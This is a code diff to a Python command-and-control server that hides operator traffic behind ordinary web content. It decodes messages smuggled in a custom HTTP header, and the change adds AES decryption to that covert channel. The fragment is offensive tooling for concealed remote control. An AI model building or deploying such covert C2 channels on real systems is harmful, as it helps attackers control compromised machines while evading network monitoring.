@@ -4,7 +4,6 @@ Executes on the C2 server. Runs an HTTP server that listens for requests from th
 Assumes only one client connects.
 '''
 
-# from urllib import request, parse
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 from socketserver import ThreadingMixIn
 import base64
@@ -12,7 +11,8 @@ import zlib
 import threading
 from queue import Queue
 import time
-from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, RequestFlags
+from Crypto.Cipher import AES
+from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, AES_KEY, AES_IV, RequestFlags
 
 WEB_DIRECTORY = 'web' # Root directory of website files.
 
@@ -30,8 +30,8 @@ def get_original_message(encoded_message: str, request_flags: RequestFlags):
     if RequestFlags.IS_NOT_COMPRESSED not in request_flags:
         decompressed_bytes = zlib.decompress(decoded_bytes)
     # 3. Unencrypt
-    unencrypted_bytes = decompressed_bytes # TODO
-    return unencrypted_bytes.decode()
+    decryptor = AES.new(AES_KEY, AES.MODE_CFB, iv=AES_IV)
+    return decryptor.decrypt(decompressed_bytes).decode()
 
 def wait_for_user_input():
     global user_inputs
@@ -106,10 +106,6 @@ class RequestHandler(SimpleHTTPRequestHandler):
         if not self.is_stego_request():
             self.serve_normal_web_content()
             return    
-        # TODO
-        # if empty request, print
-        # if not empty request, if not last message, append to queue
-            # if last message, if compressed, decompress. Then, print
 
         encoded_str = self.get_request_encoded_str()
         if len(encoded_str) == 0:
